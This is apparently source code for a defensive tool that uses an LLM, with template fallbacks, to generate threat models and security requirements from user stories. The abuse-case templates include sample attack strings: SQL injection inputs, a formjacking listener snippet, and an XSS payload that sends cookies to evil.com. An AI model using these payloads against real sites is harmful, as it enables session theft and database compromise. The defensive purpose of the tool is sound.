"""
Security Requirements Analyzer Service
Analyzes user stories to generate security requirements, threats, and abuse cases
"""
import os
import json
import time
from typing import Dict, Any, List, Optional

from dotenv import load_dotenv
load_dotenv()  # Load .env file

# Try multiple AI providers
try:
    from openai import OpenAI
    OPENAI_AVAILABLE = True
except ImportError:
    OPENAI_AVAILABLE = False

try:
    import anthropic
    ANTHROPIC_AVAILABLE = True
except ImportError:
    ANTHROPIC_AVAILABLE = False


class SecurityRequirementsAnalyzer:
    """Analyzes user stories to generate security requirements using AI"""

    # Default prompt instructions that can be customized via settings
    DEFAULT_ABUSE_CASE_PROMPT = """Generate 5-7 highly detailed abuse cases. For EACH abuse case provide:

1. **Threat Title**: Specific attack name (e.g., "SQL Injection via Search Parameter", "Session Hijacking through XSS")
2. **Threat Actor**: External Attacker / Malicious Insider / Automated Bot / Competitor / Nation-State Actor
3. **Attack Prerequisites**:
   • Required knowledge or access level
   • Tools and resources needed
   • Time and effort estimation
4. **Detailed Attack Scenario** (MUST be 8-12 lines):
   • RECONNAISSANCE: How attacker discovers the vulnerability (port scanning, directory enumeration, source code review)
   • WEAPONIZATION: Tools prepared (Burp Suite, SQLMap, Metasploit, Hydra, custom scripts)
   • DELIVERY: Attack vector used (malicious URL, crafted input, uploaded file, API call)
   • EXPLOITATION: Step-by-step technical execution with example payloads
   • INSTALLATION: Persistence mechanisms if applicable
   • COMMAND & CONTROL: Data exfiltration methods
   • ACTIONS ON OBJECTIVES: Final impact (data theft, privilege escalation, system compromise)
5. **Technical Details**:
   • Example attack payloads or commands
   • Vulnerable code patterns exploited
   • Network protocols or APIs abused
6. **Impact Assessment**:
   • Confidentiality impact (data exposed)
   • Integrity impact (data modified)
   • Availability impact (service disruption)
   • Financial impact estimation
   • Regulatory/compliance implications
7. **Likelihood Factors**: High/Medium/Low with justification based on attack complexity and attacker motivation
8. **STRIDE Category**: Spoofing/Tampering/Repudiation/Information Disclosure/Denial of Service/Elevation of Privilege
9. **Detailed Mitigations** (provide 5-6 specific mitigations):
   • Preventive controls with implementation details
   • Detective controls (monitoring, alerting)
   • Corrective controls (incident response)
   • Specific libraries/frameworks (e.g., OWASP ESAPI, helmet.js, bcrypt)
   • Configuration examples
   • Verification through security testing (SAST, DAST, penetration test)"""

    DEFAULT_SECURITY_REQ_PROMPT = """Generate 8-10 highly detailed security requirements. For EACH requirement provide:

1. **Requirement ID**: Unique identifier (SR-001, SR-002, etc.)
2. **Requirement Title**: Clear, actionable security control statement
3. **Priority**: Critical/High/Medium/Low (based on risk and exploitability)
4. **Category**: Authentication/Authorization/Input Validation/Cryptography/Logging/Rate Limiting/API Security/Data Protection/Session Management/Error Handling
5. **Detailed Description** (MUST be 6-10 lines):
   • Comprehensive explanation of the security control
   • Technical implementation approach
   • Integration with existing security architecture
   • Dependencies and prerequisites
6. **Threat Context**:
   • Specific threats this requirement mitigates
   • Attack scenarios prevented
   • Historical breach examples (if applicable)
7. **Compliance & Standards Mapping**:
   • CWE references (e.g., CWE-89 SQL Injection, CWE-79 XSS)
   • OWASP Top 10 2021 mapping (e.g., A03:2021 Injection)
   • OWASP ASVS control references
   • PCI-DSS requirements (if applicable)
   • GDPR/CCPA articles (if applicable)
   • NIST CSF controls
8. **Implementation Guidance**:
   • Recommended libraries/frameworks (bcrypt, argon2, helmet.js, OWASP ESAPI)
   • Code patterns and examples
   • Configuration settings
   • Architecture considerations
   • Performance implications
9. **Acceptance Criteria** (MUST be 4-6 specific, testable criteria):
   • Functional test cases with expected outcomes
   • Security test scenarios (positive and negative)
   • Performance benchmarks
   • Automated test integration (unit, integration, security)
   • Manual verification steps
10. **Verification Methods**:
    • SAST tool checks
    • DAST scanning approach
    • Manual code review checklist
    • Penetration testing scope"""

    STRIDE_CATEGORIES = [
        {"id": "S", "name": "Spoofing", "description": "Pretending to be something or someone else"},
        {"id": "T", "name": "Tampering", "description": "Modifying data or code"},
        {"id": "R", "name": "Repudiation", "description": "Claiming to not have performed an action"},
        {"id": "I", "name": "Information Disclosure", "description": "Exposing information to unauthorized users"},
        {"id": "D", "name": "Denial of Service", "description": "Deny or degrade service to users"},
        {"id": "E", "name": "Elevation of Privilege", "description": "Gain capabilities without authorization"},
    ]

    COMPLIANCE_STANDARDS = {
        "OWASP ASVS": {
            "V1": "Architecture, Design and Threat Modeling",
            "V2": "Authentication",
            "V3": "Session Management",
            "V4": "Access Control",
            "V5": "Validation, Sanitization and Encoding",
            "V6": "Stored Cryptography",
            "V7": "Error Handling and Logging",
            "V8": "Data Protection",
            "V9": "Communication",
            "V10": "Malicious Code",
            "V11": "Business Logic",
            "V12": "Files and Resources",
            "V13": "API and Web Service",
            "V14": "Configuration",
        },
        "PCI-DSS": {
            "Req 1": "Install and maintain network security controls",
            "Req 2": "Apply secure configurations",
            "Req 3": "Protect stored account data",
            "Req 4": "Protect cardholder data with strong cryptography",
            "Req 5": "Protect systems from malicious software",
            "Req 6": "Develop and maintain secure systems",
            "Req 7": "Restrict access to system components",
            "Req 8": "Identify users and authenticate access",
            "Req 9": "Restrict physical access",
            "Req 10": "Log and monitor access",
            "Req 11": "Test security systems regularly",
            "Req 12": "Support information security with policies",
        },
    }

    def __init__(self, api_key: Optional[str] = None, provider: str = "openai",
                 custom_abuse_case_prompt: Optional[str] = None,
                 custom_security_req_prompt: Optional[str] = None):
        """Initialize the analyzer with AI provider and optional custom prompts"""
        self.provider = provider
        self.client = None
        self.model = None

        # Store custom prompts (use defaults if not provided)
        self.abuse_case_prompt = custom_abuse_case_prompt or self.DEFAULT_ABUSE_CASE_PROMPT
        self.security_req_prompt = custom_security_req_prompt or self.DEFAULT_SECURITY_REQ_PROMPT

        print(f"[SecurityAnalyzer] Initializing with provider={provider}, api_key={'SET' if api_key else 'NOT SET'}")
        print(f"[SecurityAnalyzer] OPENAI_AVAILABLE={OPENAI_AVAILABLE}, ANTHROPIC_AVAILABLE={ANTHROPIC_AVAILABLE}")

        # Try primary provider first
        if provider == "anthropic" and ANTHROPIC_AVAILABLE:
            key = api_key or os.getenv("ANTHROPIC_API_KEY")
            if key:
                self.client = anthropic.Anthropic(api_key=key)
                self.model = "claude-sonnet-4-20250514"  # Use Sonnet for faster analysis
                print(f"[SecurityAnalyzer] Using Anthropic with model={self.model}")
            else:
                print("[SecurityAnalyzer] Anthropic selected but no API key found, trying OpenAI fallback")
        elif provider == "openai" and OPENAI_AVAILABLE:
            key = api_key or os.getenv("OPENAI_API_KEY")
            if key:
                self.client = OpenAI(api_key=key)
                self.model = "gpt-4o"
                print(f"[SecurityAnalyzer] Using OpenAI with model={self.model}")
            else:
                print("[SecurityAnalyzer] OpenAI selected but no API key found")

        # Fallback: If primary provider failed, try the other one
        if self.client is None:
            # Try OpenAI as fallback
            if OPENAI_AVAILABLE:
                openai_key = os.getenv("OPENAI_API_KEY")
                if openai_key:
                    self.client = OpenAI(api_key=openai_key)
                    self.model = "gpt-4o"
                    self.provider = "openai"
                    print(f"[SecurityAnalyzer] Fallback to OpenAI with model={self.model}")
            # Try Anthropic as fallback
            if self.client is None and ANTHROPIC_AVAILABLE:
                anthropic_key = os.getenv("ANTHROPIC_API_KEY")
                if anthropic_key:
                    self.client = anthropic.Anthropic(api_key=anthropic_key)
                    self.model = "claude-sonnet-4-20250514"  # Use Sonnet for faster analysis
                    self.provider = "anthropic"
                    print(f"[SecurityAnalyzer] Fallback to Anthropic with model={self.model}")

        if self.client is None:
            print(f"[SecurityAnalyzer] No AI provider available, will use template analysis")

    def analyze_story(self, story: Dict[str, Any]) -> Dict[str, Any]:
        """
        Analyze a user story for security concerns

        Args:
            story: Dict with title, description, acceptance_criteria

        Returns:
            Dict with abuse_cases, stride_threats, security_requirements, risk_score
        """
        start_time = time.time()

        title = story.get("title", "")
        description = story.get("description", "")
        acceptance_criteria = story.get("acceptance_criteria", "")

        # Try AI analysis first with retries
        if self.client:
            print(f"[SecurityAnalyzer] Using AI analysis with {self.provider}/{self.model}")
            max_retries = 3
            for attempt in range(max_retries):
                try:
                    result = self._ai_analyze(title, description, acceptance_criteria)
                    result["analysis_duration_ms"] = int((time.time() - start_time) * 1000)
                    result["ai_model_used"] = self.model
                    print(f"[SecurityAnalyzer] AI analysis completed: {len(result.get('abuse_cases', []))} abuse cases, {len(result.get('security_requirements', []))} requirements")
                    return result
                except Exception as e:
                    error_msg = str(e)
                    # Retry on network/connection errors
                    if attempt < max_retries - 1 and ("connection" in error_msg.lower() or "timeout" in error_msg.lower() or "incomplete" in error_msg.lower() or "peer closed" in error_msg.lower()):
                        print(f"[SecurityAnalyzer] AI analysis attempt {attempt + 1} failed: {e}, retrying...")
                        time.sleep(2)  # Brief pause before retry
                        continue
                    print(f"[SecurityAnalyzer] AI analysis failed after {attempt + 1} attempts: {e}, falling back to template analysis")
                    import traceback
                    traceback.print_exc()
                    break
        else:
            print(f"[SecurityAnalyzer] No AI client available, using template analysis")

        # Fallback to template-based analysis
        result = self._template_analyze(title, description, acceptance_criteria)
        result["analysis_duration_ms"] = int((time.time() - start_time) * 1000)
        result["ai_model_used"] = "template"
        print(f"[SecurityAnalyzer] Template analysis completed: {len(result.get('abuse_cases', []))} abuse cases, {len(result.get('security_requirements', []))} requirements")
        return result

    def _ai_analyze(self, title: str, description: str, acceptance_criteria: str) -> Dict[str, Any]:
        """Use AI to analyze the user story"""
        prompt = self._build_analysis_prompt(title, description, acceptance_criteria)

        if self.provider == "anthropic":
            # Use non-streaming API call (more stable than streaming)
            response = self.client.messages.create(
                model=self.model,
                max_tokens=4096,  # Reduced for faster response
                messages=[{"role": "user", "content": prompt}]
            )
            content = response.content[0].text
        else:  # OpenAI
            response = self.client.chat.completions.create(
                model=self.model,
                max_tokens=4096,  # Reduced for faster response
                messages=[
                    {"role": "system", "content": "You are a security architect. Generate concise, actionable security analysis. Return only valid JSON."},
                    {"role": "user", "content": prompt}
                ]
            )
            content = response.choices[0].message.content

        # Parse JSON from response
        try:
            # Try to extract JSON from the response
            json_start = content.find('{')
            json_end = content.rfind('}') + 1
            if json_start != -1 and json_end > json_start:
                json_str = content[json_start:json_end]
                result = json.loads(json_str)
                return self._validate_and_enhance_result(result)
        except json.JSONDecodeError:
            pass

        # If JSON parsing fails, return template analysis
        return self._template_analyze(title, description, acceptance_criteria)

    def _build_analysis_prompt(self, title: str, description: str, acceptance_criteria: str) -> str:
        """Build the prompt for AI analysis - generates clean, structured security analysis"""
        ac_section = f"\nAcceptance Criteria: {acceptance_criteria}" if acceptance_criteria else ""

        return f"""Analyze this user story for security threats. Return clean, structured JSON.

User Story: {title}
Description: {description}{ac_section}

{self.abuse_case_prompt}

{self.security_req_prompt}

Return this JSON structure:
{{
  "abuse_cases": [
    {{
      "id": "AC-001",
      "title": "Clear attack title",
      "threat_actor": "External Attacker / Malicious Insider / Automated Bot",
      "description": "• Discovery: Attacker identifies the vulnerability through reconnaissance\\n• Tools: Uses Burp Suite, SQLMap, or similar tools for exploitation\\n• Methodology: Executes the attack step-by-step\\n• Impact: Data exfiltration, privilege escalation, or system compromise\\n• Business Impact: Financial loss, reputation damage, compliance violations",
      "impact": "Critical/High/Medium/Low",
      "likelihood": "High/Medium/Low",
      "stride_category": "Spoofing/Tampering/Repudiation/Information Disclosure/Denial of Service/Elevation of Privilege",
      "mitigations": [
        "Implement specific security control with exact implementation steps",
        "Use security library (e.g., helmet.js, bcrypt, prepared statements)",
        "Configure security settings (e.g., CSP headers, HTTPS only)",
        "Verify with security testing (e.g., OWASP ZAP scan, penetration test)"
      ]
    }}
  ],
  "stride_threats": [
    {{"category": "Spoofing", "threat": "Threat name", "description": "Detailed description", "risk_level": "Critical/High/Medium/Low"}}
  ],
  "security_requirements": [
    {{
      "id": "SR-001",
      "requirement": "Clear, actionable requirement title",
      "priority": "Critical/High/Medium/Low",
      "category": "Authentication/Authorization/Input Validation/Cryptography/Logging/Rate Limiting/API Security/Data Protection",
      "rationale": "• Purpose: Why this control is essential for security\\n• Threats Mitigated: SQL Injection, XSS, CSRF attacks\\n• CWE Reference: CWE-89, CWE-79\\n• OWASP: A03:2021 Injection\\n• Compliance: PCI-DSS Req 6, GDPR Article 32\\n• Business Risk: Data breach, regulatory fines, reputation damage",
      "acceptance_criteria": "• All user inputs are validated against whitelist patterns\\n• SQL queries use parameterized statements or ORM\\n• Security scan shows zero injection vulnerabilities\\n• Code review confirms no dynamic query construction"
    }}
  ],
  "risk_score": 75
}}

CRITICAL FORMATTING RULES:
1. Use \\n to separate bullet points in description, rationale, and acceptance_criteria
2. Start each bullet point with • (bullet character)
3. Each field must have 4-6 detailed bullet points
4. Be specific - mention actual tools, libraries, standards, and techniques

Generate 5-7 detailed abuse_cases and 8-10 security_requirements specific to: {title}
Return ONLY valid JSON with proper escaping."""

    def _template_analyze(self, title: str, description: str, acceptance_criteria: str) -> Dict[str, Any]:
        """Template-based analysis when AI is not available"""
        full_text = f"{title} {description} {acceptance_criteria}".lower()

        abuse_cases = []
        stride_threats = {cat["id"]: [] for cat in self.STRIDE_CATEGORIES}
        security_requirements = []
        risk_factors = []
        risk_score = 30  # Base risk score

        # Detect patterns and generate analysis
        patterns = self._detect_patterns(full_text)

        req_counter = 1
        abuse_counter = 1

        for pattern in patterns:
            # Add abuse cases
            for abuse in pattern.get("abuse_cases", []):
                abuse_cases.append({
                    "id": f"AC-{abuse_counter:03d}",
                    "title": abuse["title"],
                    "description": abuse["description"],
                    "threat_actor": abuse.get("threat_actor", "External Attacker"),
                    "impact": abuse.get("impact", "medium"),
                    "likelihood": abuse.get("likelihood", "medium")
                })
                abuse_counter += 1

            # Add STRIDE threats
            for stride_cat, threats in pattern.get("stride_threats", {}).items():
                for threat in threats:
                    stride_threats[stride_cat].append({
                        "id": f"{stride_cat}-{len(stride_threats[stride_cat]) + 1:03d}",
                        "threat": threat["threat"],
                        "mitigation": threat["mitigation"]
                    })

            # Add security requirements
            for req in pattern.get("requirements", []):
                security_requirements.append({
                    "id": f"SR-{req_counter:03d}",
                    "category": req["category"],
                    "requirement": req["requirement"],
                    "priority": req.get("priority", "should"),
                    "rationale": req.get("rationale", "Security best practice"),
                    "acceptance_criteria": req.get("acceptance_criteria", "Verified through security testing")
                })
                req_counter += 1

            # Add risk factors
            if pattern.get("risk_factor"):
                risk_factors.append(pattern["risk_factor"])
                risk_score += pattern["risk_factor"]["score"]

        # Ensure we have at least some baseline requirements
        if not security_requirements:
            security_requirements = self._get_baseline_requirements()

        risk_score = min(100, risk_score)

        return {
            "abuse_cases": abuse_cases,
            "stride_threats": stride_threats,
            "security_requirements": security_requirements,
            "risk_score": risk_score,
            "risk_factors": risk_factors
        }

    def _detect_patterns(self, text: str) -> List[Dict]:
        """Detect security-relevant patterns in text"""
        patterns = []

        # Authentication patterns
        auth_keywords = ["login", "sign in", "authenticate", "password", "credential", "user account"]
        if any(kw in text for kw in auth_keywords):
            patterns.append({
                "abuse_cases": [
                    {
                        "title": "Brute Force Password Attack",
                        "description": "• RECONNAISSANCE: Attacker identifies login endpoint through directory enumeration and observes authentication flow\n• WEAPONIZATION: Prepares wordlists from common passwords, leaked databases, and generates variations using tools like Hashcat rules\n• DELIVERY: Uses automated tools (Hydra, Burp Intruder, custom Python scripts) to submit rapid login attempts\n• EXPLOITATION: Bypasses weak rate limiting by rotating IP addresses through proxy chains or botnets\n• TECHNICAL DETAILS: POST /api/auth/login with username/password combinations at 100+ requests/second\n• IMPACT: Unauthorized account access leading to data theft, identity fraud, or lateral movement within the system\n• BUSINESS IMPACT: Customer data breach, regulatory fines (GDPR up to 4% revenue), reputation damage",
                        "threat_actor": "External Attacker / Automated Bot",
                        "impact": "Critical",
                        "likelihood": "High",
                        "stride_category": "Spoofing",
                        "mitigations": [
                            "Implement progressive rate limiting: 5 attempts/minute, 20 attempts/hour per IP and username combination",
                            "Deploy CAPTCHA (reCAPTCHA v3 or hCaptcha) after 3 failed attempts",
                            "Implement account lockout with exponential backoff (15min, 1hr, 24hr)",
                            "Use bcrypt or Argon2id for password hashing with cost factor >= 12",
                            "Monitor and alert on authentication anomalies using SIEM integration",
                            "Require MFA for all accounts, especially privileged users"
                        ]
                    },
                    {
                        "title": "Credential Stuffing Attack",
                        "description": "• RECONNAISSANCE: Attacker obtains leaked credential databases from dark web marketplaces or previous breaches\n• WEAPONIZATION: Cross-references emails with target application's user base using OSINT techniques\n• DELIVERY: Uses credential stuffing tools (Sentry MBA, OpenBullet, custom scripts) with proxy rotation\n• EXPLOITATION: Exploits password reuse across multiple services - studies show 65% of users reuse passwords\n• TECHNICAL DETAILS: Automated login attempts using username:password pairs from breaches like Collection #1-5\n• IMPACT: Mass account takeover affecting potentially thousands of users\n• BUSINESS IMPACT: Customer trust erosion, class action lawsuits, mandatory breach notifications",
                        "threat_actor": "External Attacker / Organized Crime",
                        "impact": "Critical",
                        "likelihood": "High",
                        "stride_category": "Spoofing",
                        "mitigations": [
                            "Integrate with HaveIBeenPwned API to check passwords against known breaches",
                            "Implement device fingerprinting and behavioral analysis for anomaly detection",
                            "Require email/SMS verification for logins from new devices or locations",
                            "Deploy Web Application Firewall (WAF) with bot detection capabilities",
                            "Implement login velocity checks across the entire platform",
                            "Force password reset for accounts detected in breach databases"
                        ]
                    },
                    {
                        "title": "Session Hijacking via Token Theft",
                        "description": "• RECONNAISSANCE: Attacker analyzes session management mechanism through traffic interception\n• WEAPONIZATION: Sets up network sniffing on shared WiFi or compromises client machine\n• DELIVERY: Intercepts session tokens via XSS, network sniffing, or malware on victim's device\n• EXPLOITATION: Replays stolen session token to impersonate legitimate user without credentials\n• TECHNICAL DETAILS: Stealing JWT from localStorage/sessionStorage via XSS, or session cookie via network MITM\n• IMPACT: Complete account takeover with full access to user's data and permissions\n• BUSINESS IMPACT: Unauthorized transactions, data exfiltration, compliance violations",
                        "threat_actor": "External Attacker / Malicious Insider",
                        "impact": "High",
                        "likelihood": "Medium",
                        "stride_category": "Spoofing",
                        "mitigations": [
                            "Store tokens in httpOnly, secure, sameSite=strict cookies instead of localStorage",
                            "Implement short-lived access tokens (15 min) with refresh token rotation",
                            "Bind session to client fingerprint (IP, User-Agent hash) with re-authentication on change",
                            "Implement token revocation on password change or security events",
                            "Use TLS 1.3 for all communications with HSTS preload",
                            "Monitor for concurrent sessions from different geographic locations"
                        ]
                    }
                ],
                "stride_threats": {
                    "S": [{"threat": "Attacker spoofs legitimate user identity through credential theft or session hijacking", "mitigation": "Implement MFA, device binding, and behavioral analysis"}],
                    "I": [{"threat": "Password or session token exposed in transit, logs, or client-side storage", "mitigation": "Use HTTPS only, never log credentials, use httpOnly cookies"}],
                    "E": [{"threat": "Privilege escalation via authentication bypass or role manipulation", "mitigation": "Implement proper RBAC with server-side validation, principle of least privilege"}]
                },
                "requirements": [
                    {
                        "category": "Authentication",
                        "requirement": "Implement adaptive rate limiting on all authentication endpoints",
                        "priority": "Critical",
                        "rationale": "• Prevents brute force and credential stuffing attacks that can compromise user accounts\n• Mitigates CWE-307 (Improper Restriction of Excessive Authentication Attempts)\n• Required by OWASP ASVS V2.2.1 and PCI-DSS Requirement 8.1.6\n• Without this control, attackers can attempt millions of password combinations",
                        "acceptance_criteria": "• Rate limit of 5 failed attempts per minute per IP/username enforced\n• Exponential backoff implemented after threshold exceeded\n• Automated tests verify rate limiting blocks excessive attempts\n• Monitoring alerts configured for rate limit triggers"
                    },
                    {
                        "category": "Authentication",
                        "requirement": "Enforce cryptographically secure password storage using Argon2id",
                        "priority": "Critical",
                        "rationale": "• Protects passwords even if database is compromised\n• Argon2id is the winner of Password Hashing Competition, resistant to GPU/ASIC attacks\n• Mitigates CWE-916 (Use of Password Hash With Insufficient Computational Effort)\n• Required by OWASP ASVS V2.4.1 and NIST SP 800-63B",
                        "acceptance_criteria": "• All passwords hashed with Argon2id (memory=64MB, iterations=3, parallelism=4)\n• No plaintext or weakly hashed passwords in database\n• Password hash timing is constant regardless of input\n• Unit tests verify hash generation and verification"
                    },
                    {
                        "category": "Authentication",
                        "requirement": "Implement account lockout with secure recovery mechanism",
                        "priority": "High",
                        "rationale": "• Stops brute force attacks by locking accounts after failed attempts\n• Mitigates CWE-307 and reduces attack surface\n• Balance security with usability through progressive lockout\n• OWASP ASVS V2.2.1 compliance requirement",
                        "acceptance_criteria": "• Account locked after 5 consecutive failed attempts\n• Lockout duration increases exponentially (15min, 1hr, 24hr)\n• Secure unlock via email verification or admin intervention\n• Lockout events logged with IP, timestamp, username"
                    },
                    {
                        "category": "Logging",
                        "requirement": "Comprehensive authentication event logging with SIEM integration",
                        "priority": "High",
                        "rationale": "• Enables detection of brute force, credential stuffing, and account takeover attempts\n• Required for incident response and forensic analysis\n• PCI-DSS Requirement 10.2 mandates logging of authentication events\n• GDPR Article 33 requires breach detection capabilities",
                        "acceptance_criteria": "• All auth events logged: success, failure, lockout, unlock, password change\n• Logs include timestamp, IP, user-agent, username, result, failure reason\n• Logs forwarded to SIEM with alerting rules configured\n• Log retention minimum 1 year, tamper-evident storage"
                    }
                ],
                "risk_factor": {"factor": "Authentication", "score": 25, "description": "Feature involves user authentication - primary target for attackers"}
            })

        # Payment/Financial patterns
        payment_keywords = ["payment", "credit card", "transaction", "purchase", "billing", "checkout"]
        if any(kw in text for kw in payment_keywords):
            patterns.append({
                "abuse_cases": [
                    {
                        "title": "Payment Card Data Theft via Formjacking",
                        "description": "• RECONNAISSANCE: Attacker identifies payment form endpoints and JavaScript dependencies\n• WEAPONIZATION: Creates malicious JavaScript payload that captures card data on form submission\n• DELIVERY: Compromises third-party JavaScript library or injects script via XSS vulnerability\n• EXPLOITATION: Malicious script silently exfiltrates card numbers, CVV, expiry to attacker's server\n• TECHNICAL DETAILS: JavaScript keylogger on input fields: document.querySelector('#card-number').addEventListener('input', exfil)\n• REAL-WORLD EXAMPLE: British Airways breach (2018) - 380,000 cards stolen via formjacking\n• IMPACT: Mass payment card theft, PCI-DSS non-compliance, mandatory breach notification\n• BUSINESS IMPACT: Fines up to $500K per incident, card brand penalties, customer lawsuits",
                        "threat_actor": "External Attacker / Organized Crime (Magecart groups)",
                        "impact": "Critical",
                        "likelihood": "Medium",
                        "stride_category": "Information Disclosure",
                        "mitigations": [
                            "Implement Content Security Policy (CSP) with strict script-src directives",
                            "Use Subresource Integrity (SRI) for all third-party JavaScript",
                            "Host payment forms on isolated subdomain with minimal JavaScript",
                            "Implement real-time JavaScript integrity monitoring",
                            "Use payment tokenization (Stripe Elements, Braintree Hosted Fields) to avoid handling raw card data",
                            "Regular security scanning of all JavaScript dependencies"
                        ]
                    },
                    {
                        "title": "Transaction Amount Manipulation",
                        "description": "• RECONNAISSANCE: Attacker analyzes checkout flow using browser DevTools and proxy interception\n• WEAPONIZATION: Identifies client-side price calculations or hidden form fields with amounts\n• DELIVERY: Uses Burp Suite to intercept and modify POST request with payment details\n• EXPLOITATION: Changes price from $100.00 to $1.00 in request body before server processes\n• TECHNICAL DETAILS: Modify JSON payload: {'item_id': '123', 'price': 1.00, 'quantity': 1}\n• IMPACT: Financial loss from products sold below cost, inventory discrepancies\n• BUSINESS IMPACT: Direct revenue loss, potential for large-scale fraud if automated",
                        "threat_actor": "External Attacker / Opportunistic Fraudster",
                        "impact": "High",
                        "likelihood": "High",
                        "stride_category": "Tampering",
                        "mitigations": [
                            "Never trust client-side price calculations - always calculate amounts server-side from product catalog",
                            "Sign cart contents with HMAC to detect tampering",
                            "Implement server-side validation comparing submitted price against database price",
                            "Log all price discrepancies for fraud investigation",
                            "Use transaction signing for high-value purchases",
                            "Implement velocity checks for unusual purchasing patterns"
                        ]
                    },
                    {
                        "title": "Card Testing Fraud (Carding Attack)",
                        "description": "• RECONNAISSANCE: Attacker obtains lists of potentially valid card numbers from dark web\n• WEAPONIZATION: Sets up automated scripts to test card validity via small transactions\n• DELIVERY: Submits hundreds of $1 transactions to verify which cards are active\n• EXPLOITATION: Validated cards sold on dark web or used for larger fraudulent purchases\n• TECHNICAL DETAILS: Automated POST to /checkout with rotating card numbers, checking for success response\n• IMPACT: High chargeback rates, payment processor penalties, account termination\n• BUSINESS IMPACT: Chargeback fees ($15-100 per incident), processor relationship damage",
                        "threat_actor": "External Attacker / Automated Bot",
                        "impact": "High",
                        "likelihood": "High",
                        "stride_category": "Tampering",
                        "mitigations": [
                            "Implement CAPTCHA on payment forms after first failed attempt",
                            "Use 3D Secure 2.0 for all card-not-present transactions",
                            "Implement velocity limits: max 3 card attempts per session/IP",
                            "Deploy fraud detection ML models (Stripe Radar, Signifyd)",
                            "Block known proxy/VPN IP ranges on payment endpoints",
                            "Require AVS (Address Verification) and CVV match"
                        ]
                    }
                ],
                "stride_threats": {
                    "T": [{"threat": "Transaction amount manipulation via request tampering", "mitigation": "Server-side price calculation with cryptographic cart signing"}],
                    "R": [{"threat": "User disputes legitimate transaction (friendly fraud)", "mitigation": "Comprehensive transaction logging with device fingerprint and IP"}],
                    "I": [{"threat": "Payment card data exposure via formjacking or database breach", "mitigation": "Use payment tokenization, never store full PAN, implement CSP"}]
                },
                "requirements": [
                    {
                        "category": "Data Protection",
                        "requirement": "Implement PCI-DSS compliant payment card handling using tokenization",
                        "priority": "Critical",
                        "rationale": "• PCI-DSS mandates protection of cardholder data (Requirement 3)\n• Storing full card numbers exposes business to massive liability\n• Tokenization removes PCI scope from application servers\n• Breach of card data results in fines up to $500K and brand damage\n• CWE-311 (Missing Encryption of Sensitive Data)",
                        "acceptance_criteria": "• No full card numbers stored in application database\n• Payment processor tokenization (Stripe, Braintree) implemented\n• PCI SAQ-A or SAQ-A-EP compliance achieved\n• Quarterly ASV scans show no card data exposure"
                    },
                    {
                        "category": "Input Validation",
                        "requirement": "Server-side validation of all transaction amounts with cryptographic integrity",
                        "priority": "Critical",
                        "rationale": "• Prevents price manipulation attacks that cause direct financial loss\n• Client-side prices can be trivially modified via browser tools\n• CWE-20 (Improper Input Validation)\n• OWASP ASVS V5.1.3 requires server-side validation",
                        "acceptance_criteria": "• All prices retrieved from server-side product catalog at checkout\n• Cart contents signed with HMAC, validated before payment processing\n• Price discrepancies logged and flagged for review\n• Automated tests verify price manipulation attempts are rejected"
                    },
                    {
                        "category": "Logging",
                        "requirement": "Comprehensive financial transaction audit trail with tamper-evident storage",
                        "priority": "Critical",
                        "rationale": "• Required for fraud investigation and chargeback disputes\n• PCI-DSS Requirement 10 mandates transaction logging\n• SOX compliance requires financial audit trails\n• Essential for forensic analysis in breach scenarios",
                        "acceptance_criteria": "• All transactions logged: amount, timestamp, user, IP, device fingerprint, result\n• Logs stored in append-only, tamper-evident storage\n• Retention minimum 7 years for financial compliance\n• Real-time alerting on suspicious transaction patterns"
                    },
                    {
                        "category": "Rate Limiting",
                        "requirement": "Implement anti-carding controls with velocity limits and bot detection",
                        "priority": "High",
                        "rationale": "• Prevents card testing fraud that leads to high chargebacks\n• Payment processors may terminate accounts with >1% chargeback rate\n• Automated carding attempts are easily detectable with proper controls\n• CWE-799 (Improper Control of Interaction Frequency)",
                        "acceptance_criteria": "• Maximum 3 failed card attempts per session before CAPTCHA required\n• IP-based velocity limits: 10 transactions per hour\n• Bot detection integrated (reCAPTCHA Enterprise, DataDome)\n• Fraud scoring integrated with payment processor"
                    }
                ],
                "risk_factor": {"factor": "Financial Data", "score": 30, "description": "Feature handles payment card data - highest risk category"}
            })

        # Data input patterns
        input_keywords = ["form", "input", "submit", "upload", "enter", "search", "query"]
        if any(kw in text for kw in input_keywords):
            patterns.append({
                "abuse_cases": [
                    {
                        "title": "SQL Injection Attack",
                        "description": "• RECONNAISSANCE: Attacker probes input fields with single quotes and SQL syntax to identify vulnerable parameters\n• WEAPONIZATION: Crafts SQL injection payloads using SQLMap or manual techniques\n• DELIVERY: Submits malicious input via search box, login form, or URL parameters\n• EXPLOITATION: Executes arbitrary SQL: ' OR '1'='1' -- or UNION SELECT for data extraction\n• TECHNICAL DETAILS: Input: admin'-- in username field bypasses authentication; UNION SELECT password FROM users extracts credentials\n• DATA EXFILTRATION: Uses blind SQL injection techniques (time-based, boolean-based) to extract data character by character\n• IMPACT: Complete database compromise - read, modify, delete any data; potential for OS command execution via xp_cmdshell\n• BUSINESS IMPACT: Data breach affecting all customers, GDPR fines up to €20M, class action lawsuits",
                        "threat_actor": "External Attacker",
                        "impact": "Critical",
                        "likelihood": "High",
                        "stride_category": "Tampering",
                        "mitigations": [
                            "Use parameterized queries/prepared statements exclusively - NEVER concatenate user input into SQL",
                            "Implement ORM (SQLAlchemy, Hibernate, Entity Framework) with parameterized queries",
                            "Apply input validation with whitelist approach - reject unexpected characters",
                            "Use database accounts with minimal privileges (no DROP, no xp_cmdshell)",
                            "Deploy WAF rules for SQL injection patterns",
                            "Regular SAST scanning with tools like Semgrep, SonarQube for SQL injection vulnerabilities"
                        ]
                    },
                    {
                        "title": "Cross-Site Scripting (XSS) Attack",
                        "description": "• RECONNAISSANCE: Attacker identifies input fields that reflect content back to users without encoding\n• WEAPONIZATION: Creates malicious JavaScript payloads for cookie theft or session hijacking\n• DELIVERY: Injects script via comment field, profile name, or URL parameter\n• EXPLOITATION: Stored XSS: <script>fetch('https://evil.com/steal?c='+document.cookie)</script>\n• TECHNICAL DETAILS: Reflected XSS via search: /search?q=<script>alert(1)</script>; DOM XSS via innerHTML\n• SESSION HIJACKING: Steals session cookies, JWT tokens from localStorage, or performs actions as victim\n• IMPACT: Account takeover, data theft, malware distribution, defacement\n• BUSINESS IMPACT: Customer trust erosion, compliance violations, potential for worm-like spreading",
                        "threat_actor": "External Attacker",
                        "impact": "High",
                        "likelihood": "High",
                        "stride_category": "Information Disclosure",
                        "mitigations": [
                            "Implement context-aware output encoding (HTML, JavaScript, URL, CSS contexts)",
                            "Use templating engines with auto-escaping (React, Angular, Jinja2 with autoescape)",
